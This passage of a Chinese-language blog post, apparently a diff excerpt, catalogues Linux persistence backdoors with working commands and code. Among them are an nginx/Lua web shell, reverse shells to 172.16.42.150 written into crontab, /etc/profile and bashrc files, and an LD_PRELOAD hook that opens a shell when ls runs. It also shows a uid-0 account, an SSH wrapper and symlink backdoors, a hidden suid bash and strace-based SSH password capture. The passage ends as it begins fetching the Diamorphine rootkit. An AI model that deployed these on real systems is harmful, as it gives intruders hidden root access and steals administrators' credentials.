+<h3 id="3-2-nginx-lua"><a href="#3-2-nginx-lua" class="headerlink" title="3.2 nginx + lua"></a>3.2 nginx + lua</h3><p>要求安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/netxfly/nginx_lua_security">https://github.com/netxfly/nginx_lua_security</a></p>
+<p>安装openresty参加官网</p>
+<p><strong>部署后门</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> ~]<span class="meta"># cd /usr/local/openresty/nginx/conf</span></span><br><span class="line">[root<span class="symbol">@vuln</span> conf]<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>在nginx.conf文件的server块中加入如下内容</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location = /shadowtest &#123;  </span><br><span class="line">    default_type <span class="string">&#x27;text/plain&#x27;</span>;  </span><br><span class="line">    content_by_lua_file <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conflua/</span>shadowcmd.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>lua脚本</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln conf]# vim <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conf/</span>shadowcmd.lua</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line"><span class="keyword">local</span> post_args = ngx.req.get_post_args()</span><br><span class="line"><span class="keyword">local</span> cmd = post_args[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> cmd <span class="keyword">then</span></span><br><span class="line">    f_ret = <span class="built_in">io</span>.<span class="built_in">popen</span>(cmd)</span><br><span class="line">    <span class="keyword">local</span> ret = f_ret:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line">    ngx.say(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s&quot;</span>, ret))</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>启动openresty</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln conf]# <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/sbin/</span>nginx  -c <span class="regexp">/usr/</span>local<span class="regexp">/openresty/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p>攻击</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl <span class="string">&#x27;http://172.16.42.151/shadowtest&#x27;</span> -d <span class="string">&#x27;cmd=id&#x27;</span></span><br><span class="line"><span class="attribute">uid</span>=65534(nobody) <span class="attribute">gid</span>=65534(nogroup) <span class="attribute">groups</span>=65534(nogroup)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-计划任务后门"><a href="#4-计划任务后门" class="headerlink" title="4. 计划任务后门"></a>4. 计划任务后门</h2><p><strong>crontab反弹python shell</strong></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.150<span class="subst">\&quot;</span>,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>由于系统的不同，crontrab定时文件位置也会不同：</strong></p>
+<ul>
+<li>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></li>
+<li>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></li>
+</ul>
+<h2 id="5-环境变量后门"><a href="#5-环境变量后门" class="headerlink" title="5. 环境变量后门"></a>5. 环境变量后门</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.150/8881 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure>
+
+<p>切换到bash，执行source命令，或者新的终端调用到/etc/profle触发</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># /bin/bash</span></span><br><span class="line">root<span class="variable">@vuln</span><span class="symbol">:~</span><span class="comment"># source /etc/profile</span></span><br></pre></td></tr></table></figure>
+
+<p>同理</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>bashrc</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.bash_profile</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.bash_login</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.profile</span><br><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.15.42.150/8889 0&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.inputrc</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="6-ld-preload后⻔"><a href="#6-ld-preload后⻔" class="headerlink" title="6. ld_preload后⻔"></a>6. ld_preload后⻔</h2><p>详细参考：<a target="_blank" rel="noopener" href="https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/</a></p>
+<p>当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 <code>ls</code> 命令为例进行演示。</p>
+<p>首先查看 <code>ls</code> 这一系统命令会调用哪些库函数：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws <span class="regexp">/usr/</span>bin/ls</span><br></pre></td></tr></table></figure>
+
+<p>选择的是 strncmp 进行Hook</p>
+<ul>
+<li>hook_strncmp.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln /tmp]# <span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strncmp.so</span><br><span class="line">[root@vuln /tmp]# ls</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) 组=0(root)</span><br><span class="line">hook_strcmp.c  hook_strcmp.so  hook_strncmp.c  hook_strncmp.so  passcheck  passcheck.c</span><br><span class="line">[root@vuln /tmp]#</span><br></pre></td></tr></table></figure>
+
+<p>利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 <code>ls</code> 命令时会反弹一个 Shell：</p>
+<ul>
+<li>hook_strncmp.c</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>然后在 <code>.bashrc</code> 中写入，我这里用的是zsh，所以写入了.zshrc：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=/tmp/hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>执行ls成功收到了shell</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># nc -lvvp <span class="number">4444</span></span><br><span class="line">listening on <span class="string">[any]</span> <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16.42.151</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to <span class="string">[172.16.42.150]</span> from (UNKNOWN) <span class="string">[172.16.42.151]</span> <span class="number">4124</span></span><br></pre></td></tr></table></figure>
+
+<p>这种方式，会影响系统运行，我在执行vim后就会卡顿。</p>
+<h2 id="7-ssh公钥免密"><a href="#7-ssh公钥免密" class="headerlink" title="7. ssh公钥免密"></a>7. ssh公钥免密</h2><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p>
+<p>生成公私钥</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>此时进到 ～/.ssh目录可以看到 id_rsa 和 id_rsa.pub 两个文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.ssh</span></span><br><span class="line"><span class="keyword">ls</span></span><br></pre></td></tr></table></figure>
+
+<p>将上边 本地mac 的 <strong>id_rsa.pub</strong>里边的内容，复制到 服务器上的 <strong>.ssh/authorized_keys</strong> 文件中</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#客户端执行</span></span><br><span class="line">scp ~<span class="regexp">/.ssh/i</span>d_rsa.pub root@<span class="number">172.16</span>.<span class="number">42.150</span>:<span class="regexp">/root/i</span>d_rsa.pub</span><br><span class="line"><span class="comment">#服务端执行</span></span><br><span class="line">cat <span class="regexp">/root/i</span>d_rsa.pub &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>服务器修改权限</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">700</span> ~/.ssh </span><br><span class="line"><span class="attribute">chmod</span> <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>免密登陆</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root<span class="symbol">@ip</span> <span class="meta"># 默认端口登陆</span></span><br><span class="line">ssh root<span class="symbol">@ip</span> -p 端口号 <span class="meta"># 指定端口登陆</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-创建uid为0的后门账户"><a href="#8-创建uid为0的后门账户" class="headerlink" title="8. 创建uid为0的后门账户"></a>8. 创建uid为0的后门账户</h2><p>交互式创建</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> ~]<span class="meta"># useradd -o -u 0 shadowtest</span></span><br><span class="line">[root<span class="symbol">@debian</span> ~]<span class="meta"># passwd shadowtest</span></span><br><span class="line">新的 密码：</span><br></pre></td></tr></table></figure>
+
+<p>非交互式</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -o -u 0 shadowtest &amp;&amp; <span class="keyword">echo</span> <span class="string">&quot;shad0wtest&quot;</span> | passwd backdoor <span class="params">--stdin</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>删除用户</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">userdel -r -f backdoor</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="9-SSH-wrapper后门"><a href="#9-SSH-wrapper后门" class="headerlink" title="9. SSH wrapper后门"></a>9. SSH wrapper后门</h2><p>服务端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln ~]# cd /usr/sbin/</span><br><span class="line">[root@vuln sbin]# mv sshd ../bin/</span><br><span class="line">[root@vuln sbin]# echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# chmod u+x sshd</span><br><span class="line">[root@vuln sbin]# systemctl restart sshd</span><br><span class="line">[root@vuln sbin]#</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@debian ~]# socat STDIO TCP4:172.16.42.151:22,sourceport=13377</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">hostname</span><br><span class="line">vuln</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> struct</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span></span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> buffer</span></span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
+
+<p><strong>靶机重启，攻击机断开连接后失效</strong></p>
+<h2 id="10-ssh-软连接"><a href="#10-ssh-软连接" class="headerlink" title="10. ssh 软连接"></a>10. ssh 软连接</h2><p>靶机</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln ~]# ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su; /</span>tmp/su -oPort=<span class="number">5555</span>;</span><br><span class="line">[root@vuln ~]#</span><br></pre></td></tr></table></figure>
+
+<p>攻击机</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># ssh <span class="symbol">root@</span><span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span> -p <span class="number">5555</span></span><br><span class="line"><span class="symbol">root@</span><span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span><span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>需要输入密码</strong></p>
+<h2 id="11-suid-shell"><a href="#11-suid-shell" class="headerlink" title="11. suid shell"></a>11. suid shell</h2><p>在某个用户目录下建立一个隐藏的suid文件.233，之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>shadowtest/.<span class="number">233</span> -p</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶机：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln <span class="regexp">/home]# useradd -d /</span>home/shadowtest -m shadowtest</span><br><span class="line">[root@vuln /home]<span class="comment"># passwd shadowtest</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">[root@vuln <span class="regexp">/home]# cp /</span>bin<span class="regexp">/bash /</span>home<span class="regexp">/shadowtest/</span>.<span class="number">233</span></span><br><span class="line">[root@vuln <span class="regexp">/home]# chmod 4755 /</span>home<span class="regexp">/shadowtest/</span>.<span class="number">233</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="meta">@debian</span> ~]<span class="comment"># ssh shadowtest@172.16.42.151</span></span><br><span class="line">shadowtest<span class="meta">@172.16.42.151&#x27;s</span> password:</span><br><span class="line">$ whoami</span><br><span class="line">shadowtest</span><br><span class="line">$ /home/shadowtest/.233 -p</span><br><span class="line">.233-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="12-SSH-Keylogger（Strace）"><a href="#12-SSH-Keylogger（Strace）" class="headerlink" title="12 SSH Keylogger（Strace）"></a>12 SSH Keylogger（Strace）</h2><p>注意区别ptrace。</p>
+<p>strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p>
+<p><strong>第一种方式</strong></p>
+<p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
+<p>如果系统没有安装strace服务，先给他安装一个</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> strace</span><br></pre></td></tr></table></figure>
+
+<p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p>
+<p>比如当前用户是root</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/root/</span></span><br><span class="line">vim <span class="string">.bashrc</span></span><br></pre></td></tr></table></figure>
+
+<p>在.bashrc文件的最后一行填上</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/.sshpwd-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>使bashrc配置生效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> .bashrc</span><br></pre></td></tr></table></figure>
+
+<p>之后只要用这台机器登录其他机器或者执行su切换用户输入密码都可以被记录到/tmp/.sshpwd***文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@vuln:/tmp# ls -a</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.font-unix</span><br><span class="line">.ICE-unix</span><br><span class="line">.sshpwd-242月021645667067.log</span><br><span class="line">.sshpwd-242月021645667104.log</span><br><span class="line">systemd-private-36c85ff4ad564cf7826c4f24daa1425e-apache2.service-lPYJk8</span><br><span class="line">systemd-private-36c85ff4ad564cf7826c4f24daa1425e-systemd-timesyncd.service-8vJ5jO</span><br><span class="line">.Test-unix</span><br><span class="line">.X11-unix</span><br><span class="line">.XIM-unix</span><br></pre></td></tr></table></figure>
+
+<p>查看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@vuln:/tmp<span class="comment"># cat .sshpwd-242月021645667067.log | grep read</span></span><br><span class="line">......</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\211Jc\262!Z\224l\267.\270]\207\201`\225\34\303\313\7\277\352C\223\4\377\22\32\227\3618!\324d\275\313-\342t\312q\225\241]&quot;</span>, 8192) = 44</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;`8\20b\212\24\206\326\377\323\214\254OtNe\33=\262,\204lc\225\330\325\360&gt;\216&amp;\306\230P\256\n4\351;\357Lo\274\205\10\262\252n9n\264\177E&quot;</span>, 8192) = 52</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;r&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;o&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;o&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;t&quot;</span>, 1)                         = 1</span><br><span class="line"><span class="built_in">read</span>(4, <span class="string">&quot;\n&quot;</span>, 1)                        = 1</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\242+\276\234i\340V\254\355\37qz\361eA\263(\223\367\272\307&#123;\223\373+\177\252;&quot;</span>, 8192) = 28</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>找到密码为root</p>
+<p><strong>第二种方式</strong></p>
+<p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | <span class="keyword">grep</span> sshd    <span class="comment">//父进程PID</span></span><br><span class="line">strace -f -p <span class="number">523</span> -o <span class="regexp">/tmp/</span>.ssh.log -e trace=<span class="keyword">read</span>,<span class="keyword">write</span>,connect -s <span class="number">2048</span></span><br></pre></td></tr></table></figure>
+
+<p>执行了这两条命令后，当有其他机器ssh连接本机器时，无论密码正确还是错误，都会被记录到/tmp/.ssh.log这个日志文件中</p>
+<h2 id="13-Diamorphine后门"><a href="#13-Diamorphine后门" class="headerlink" title="13. Diamorphine后门"></a>13. Diamorphine后门</h2><p>Diamorphine 是一个Linux内核模块， 支持内核版本 2.6.x/3.x/4.x。可通过 uname -r 查看内核版本。</p>
+<p>下载</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/m0nad/</span>Diamorphine</span><br></pre></td></tr></table></figure>
+
